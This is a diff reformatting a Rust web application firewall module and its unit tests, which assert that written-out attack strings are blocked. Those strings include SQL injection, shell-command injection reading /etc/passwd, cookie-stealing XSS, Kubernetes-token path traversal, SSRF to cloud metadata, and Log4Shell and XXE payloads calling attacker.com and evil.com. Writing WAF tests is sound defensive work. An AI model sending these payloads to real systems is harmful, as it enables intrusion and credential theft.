@@ -110,7 +110,9 @@ impl WafRule {
     /// Returns true if any signature matches.
     pub fn matches(&self, normalised: &str) -> bool {
         let lower = normalised.to_lowercase();
-        self.signatures.iter().any(|sig| lower.contains(&sig.to_lowercase()))
+        self.signatures
+            .iter()
+            .any(|sig| lower.contains(&sig.to_lowercase()))
     }
 }
 
@@ -181,7 +183,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 60,
             blocking: false, // alert only — `--` common in usernames
         },
-
         // ------------------------------------------------------------------
         // Command Injection (OWASP A03:2021)
         // ------------------------------------------------------------------
@@ -230,7 +231,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 90,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // Cross-Site Scripting (OWASP A03:2021)
         // ------------------------------------------------------------------
@@ -273,7 +273,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 90,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // Path Traversal (OWASP A01:2021)
         // ------------------------------------------------------------------
@@ -307,7 +306,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 95,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // Server-Side Request Forgery (OWASP A10:2021)
         // ------------------------------------------------------------------
@@ -338,7 +336,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 90,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // Log4Shell / JNDI (OWASP A06:2021)
         // ------------------------------------------------------------------
@@ -358,7 +355,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 99,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // XXE Injection (OWASP A05:2021)
         // ------------------------------------------------------------------
@@ -377,7 +373,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 90,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // HTTP Header Injection (OWASP A03:2021)
         // ------------------------------------------------------------------
@@ -393,7 +388,6 @@ pub fn default_rule_set() -> Vec<WafRule> {
             confidence: 85,
             blocking: true,
         },
-
         // ------------------------------------------------------------------
         // API Traversal / Admin Endpoint Probing (OWASP A01:2021)
         // ------------------------------------------------------------------
@@ -458,10 +452,14 @@ impl std::fmt::Display for WafDecision {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
             Self::Allow => write!(f, "ALLOW"),
-            Self::Block { category, rule_id, .. } => {
+            Self::Block {
+                category, rule_id, ..
+            } => {
                 write!(f, "BLOCK(rule={},cat={})", rule_id, category)
             }
-            Self::Alert { category, rule_id, .. } => {
+            Self::Alert {
+                category, rule_id, ..
+            } => {
                 write!(f, "ALERT(rule={},cat={})", rule_id, category)
             }
         }
@@ -728,19 +726,37 @@ mod tests {
     #[test]
     fn test_sqli_union_select_blocked() {
         let d = waf_eval("GET /search?q=1+UNION+SELECT+username,password+FROM+users--");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::SqlInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::SqlInjection,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_sqli_boolean_blind_blocked() {
         let d = waf_eval("username=' OR '1'='1&password=anything");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::SqlInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::SqlInjection,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_sqli_drop_table_blocked() {
         let d = waf_eval("POST /api/v1/users\r\n\r\n{\"name\": \"'; DROP TABLE users; --\"}");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::SqlInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::SqlInjection,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -750,19 +766,37 @@ mod tests {
     #[test]
     fn test_command_injection_shell_metachar_blocked() {
         let d = waf_eval("POST /api/ping\r\n\r\nhost=8.8.8.8; /bin/sh -i");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CommandInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CommandInjection,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_command_injection_backtick_blocked() {
         let d = waf_eval("GET /api/exec?cmd=`whoami`");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CommandInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CommandInjection,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_command_injection_pipe_cat_blocked() {
         let d = waf_eval("filename=report.pdf| cat /etc/passwd");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CommandInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CommandInjection,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -772,19 +806,37 @@ mod tests {
     #[test]
     fn test_xss_script_tag_blocked() {
         let d = waf_eval("GET /search?q=<script>alert('XSS')</script>");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CrossSiteScripting, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CrossSiteScripting,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_xss_event_handler_blocked() {
         let d = waf_eval("<img src=x onerror=alert(1)>");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CrossSiteScripting, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CrossSiteScripting,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_xss_javascript_protocol_blocked() {
         let d = waf_eval("href=javascript:alert(document.cookie)");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::CrossSiteScripting, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::CrossSiteScripting,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -794,19 +846,37 @@ mod tests {
     #[test]
     fn test_path_traversal_unix_blocked() {
         let d = waf_eval("GET /api/files?path=../../../etc/passwd");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::PathTraversal, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::PathTraversal,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_path_traversal_url_encoded_blocked() {
         let d = waf_eval("GET /files/%2e%2e%2fetc%2fpasswd");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::PathTraversal, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::PathTraversal,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_path_traversal_k8s_secrets_blocked() {
         let d = waf_eval("GET /api/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::PathTraversal, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::PathTraversal,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -815,20 +885,40 @@ mod tests {
 
     #[test]
     fn test_ssrf_cloud_metadata_blocked() {
-        let d = waf_eval("POST /api/fetch\r\n\r\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::Ssrf, .. }));
+        let d = waf_eval(
+            "POST /api/fetch\r\n\r\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
+        );
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::Ssrf,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_ssrf_loopback_blocked() {
         let d = waf_eval("url=http://127.0.0.1:8080/internal/admin");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::Ssrf, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::Ssrf,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_ssrf_file_protocol_blocked() {
         let d = waf_eval("callback=file:///tmp/exfiltrated_data.tar.gz");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::Ssrf, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::Ssrf,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -838,13 +928,25 @@ mod tests {
     #[test]
     fn test_log4shell_jndi_blocked() {
         let d = waf_eval("User-Agent: ${jndi:ldap://attacker.com/exploit}");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::Log4Shell, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::Log4Shell,
+                ..
+            }
+        ));
     }
 
     #[test]
     fn test_log4shell_obfuscated_blocked() {
         let d = waf_eval("X-Api-Version: ${${lower:j}ndi:${lower:l}dap://evil.com/a}");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::Log4Shell, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::Log4Shell,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -857,7 +959,13 @@ mod tests {
         // also hitting SSRF (file://) or PathTraversal (/etc/passwd) first.
         let payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://evil.com/payload\">]><foo>&xxe;</foo>";
         let d = waf_eval(payload);
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::XxeInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::XxeInjection,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -868,7 +976,13 @@ mod tests {
     fn test_crlf_header_injection_blocked() {
         // %0d%0a is URL-encoded CRLF — a classic header injection vector
         let d = waf_eval("Location: /login%0d%0aSet-Cookie: session=evil");
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::HttpHeaderInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::HttpHeaderInjection,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -878,7 +992,13 @@ mod tests {
     #[test]
     fn test_actuator_endpoint_alerts_not_blocked() {
         let d = waf_eval("GET /actuator/env HTTP/1.1");
-        assert!(matches!(d, WafDecision::Alert { category: AttackCategory::ApiTraversal, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Alert {
+                category: AttackCategory::ApiTraversal,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
@@ -912,7 +1032,13 @@ mod tests {
         // %27 = ' — must be decoded before matching
         let d = waf_eval("GET /search?q=1%27+OR+%271%27%3D%271");
         // After normalisation: "1' OR '1'='1" → triggers SQLi rule 1002
-        assert!(matches!(d, WafDecision::Block { category: AttackCategory::SqlInjection, .. }));
+        assert!(matches!(
+            d,
+            WafDecision::Block {
+                category: AttackCategory::SqlInjection,
+                ..
+            }
+        ));
     }
 
     // ------------------------------------------------------------------
